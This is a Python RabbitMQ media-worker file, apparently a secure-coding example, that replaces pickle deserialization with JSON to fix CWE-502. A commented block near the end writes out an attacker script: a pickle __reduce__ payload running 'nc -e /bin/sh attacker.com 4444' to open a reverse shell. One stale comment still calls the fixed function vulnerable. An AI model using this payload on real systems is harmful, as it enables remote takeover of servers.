import os
import sys
import pika
import pickle
import sqlite3
import logging
from datetime import datetime

# Configure logging for the Distributed Media Processing Worker
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - MediaWorker - %(levelname)s - %(message)s'
)
logger = logging.getLogger("PikaMediaService")

DB_FILE = "media_processing.db"
RABBITMQ_HOST = os.getenv("RABBITMQ_HOST", "localhost")
QUEUE_NAME = "image_resize_tasks"

def init_media_db():
    """Initializes the SQLite database for tracking media encoding jobs."""
    if os.path.exists(DB_FILE):
        return

    conn = sqlite3.connect(DB_FILE)
    cursor = conn.cursor()

    cursor.execute('''
        CREATE TABLE processed_media (
            job_id TEXT PRIMARY KEY,
            processed_at DATETIME DEFAULT CURRENT_TIMESTAMP,
            source_file TEXT NOT NULL,
            target_resolution TEXT NOT NULL,
            status TEXT NOT NULL
        )
    ''')

    mock_jobs = [
        ('job_alpha_1', datetime.now().isoformat(), 'raw_upload_1.png', '1920x1080', 'COMPLETED'),
        ('job_beta_2', datetime.now().isoformat(), 'raw_upload_2.jpg', '800x600', 'COMPLETED')
    ]
    cursor.executemany('''
        INSERT INTO processed_media (job_id, processed_at, source_file, target_resolution, status)
        VALUES (?, ?, ?, ?, ?)
    ''', mock_jobs)

    conn.commit()
    conn.close()
    logger.info("Media processing database initialized.")

def record_job_status(job_id: str, source: str, resolution: str, status: str):
    """Records the outcome of a media processing task."""
    try:
        conn = sqlite3.connect(DB_FILE)
        cursor = conn.cursor()
        cursor.execute(
            "INSERT INTO processed_media (job_id, source_file, target_resolution, status) VALUES (?, ?, ?, ?)",
            (job_id, source, resolution, status)
        )
        conn.commit()
        conn.close()
    except sqlite3.Error as e:
        logger.error(f"Database error recording job {job_id}: {e}")

class MediaTaskPayload:
    """Represents a requested media transformation task."""
    def __init__(self, job_id: str, source_path: str, target_res: str, watermark: bool):
        self.job_id = job_id
        self.source_path = source_path
        self.target_res = target_res
        self.watermark = watermark

def deserialize_amqp_payload(body_bytes: bytes, delivery_tag: int) -> MediaTaskPayload:
    """
    SECURE: Uses JSON instead of pickle to prevent Unsafe Deserialization (CWE-502).
    """
    import json
    
    logger.info(f"Decoding secure incoming AMQP message (Delivery Tag: {delivery_tag})")

    try:
        # Secure: We replace the unsafe pickle module with standard json.
        # json.loads() only parses primitive data structures (dicts, lists, strings, numbers)
        # and strictly prevents arbitrary object instantiation or remote code execution.
        # Note: Services publishing to this RabbitMQ queue must be updated to 
        # serialize their payloads using json.dumps() and encode to UTF-8.
        
        payload_str = body_bytes.decode('utf-8')
        task_dict = json.loads(payload_str)

        # Safely and manually reconstruct the MediaTaskPayload object from the parsed dictionary
        if isinstance(task_dict, dict) and all(k in task_dict for k in ("job_id", "source_path", "target_res", "watermark")):
            task = MediaTaskPayload(
                job_id=str(task_dict["job_id"]),
                source_path=str(task_dict["source_path"]),
                target_res=str(task_dict["target_res"]),
                watermark=bool(task_dict["watermark"])
            )
            logger.debug(f"Task decoded safely for job: {task.job_id}")
            return task
        else:
            logger.warning("Decoded JSON is missing required MediaTaskPayload attributes.")
            return None

    except (json.JSONDecodeError, UnicodeDecodeError) as e:
        logger.error(f"Failed to parse AMQP payload as JSON: {e}")
        return None
    except ValueError as e:
        logger.error(f"Invalid data types in AMQP payload: {e}")
        return None
    except Exception as e:
        logger.error(f"Unexpected error during payload deserialization: {e}")
        return None

def process_message(ch, method, properties, body):
    """Callback invoked by pika when a new message arrives on the queue."""
    logger.info(f"Received new message ({len(body)} bytes). Processing...")
    
    # Pass the untrusted raw bytes directly to the vulnerable function
    task = deserialize_amqp_payload(body, method.delivery_tag)
    
    if task:
        logger.info(f"Starting processing for {task.source_path} -> {task.target_res}")
        record_job_status(task.job_id, task.source_path, task.target_res, "COMPLETED")
        # Acknowledge the message so it's removed from the queue
        ch.basic_ack(delivery_tag=method.delivery_tag)
        logger.info(f"Job {task.job_id} completed and acknowledged.")
    else:
        logger.error("Invalid task payload. Rejecting message.")
        # Reject and drop the message
        ch.basic_nack(delivery_tag=method.delivery_tag, requeue=False)

def start_worker():
    """Connects to RabbitMQ and begins consuming tasks."""
    try:
        connection = pika.BlockingConnection(
            pika.ConnectionParameters(host=RABBITMQ_HOST)
        )
        channel = connection.channel()
        
        # Ensure the queue exists
        channel.queue_declare(queue=QUEUE_NAME, durable=True)
        
        # Only fetch one message at a time
        channel.basic_qos(prefetch_count=1)
        channel.basic_consume(
            queue=QUEUE_NAME, 
            on_message_callback=process_message
        )
        
        logger.info(f"Connected to RabbitMQ at {RABBITMQ_HOST}")
        logger.info(f"Waiting for media tasks on queue '{QUEUE_NAME}'...")
        
        channel.start_consuming()
        
    except pika.exceptions.AMQPConnectionError as e:
        logger.error(f"Failed to connect to RabbitMQ broker: {e}")
        sys.exit(1)
    except Exception as e:
        logger.error(f"Unexpected worker error: {e}")
        sys.exit(1)

if __name__ == "__main__":
    init_media_db()
    
    # Example Malicious Trigger:
    # 1. Attacker writes a script to publish a malicious payload to the AMQP queue:
    #    import pika, pickle, os
    #
    #    class Exploit:
    #        def __reduce__(self):
    #            return (os.system, ('nc -e /bin/sh attacker.com 4444',))
    #
    #    connection = pika.BlockingConnection(pika.ConnectionParameters('localhost'))
    #    channel = connection.channel()
    #    payload = pickle.dumps(Exploit())
    #    channel.basic_publish(exchange='', routing_key='image_resize_tasks', body=payload)
    #    connection.close()
    
    # Run the worker (blocks indefinitely)
    try:
        start_worker()
    except KeyboardInterrupt:
        logger.info("Gracefully shutting down Media Worker...")
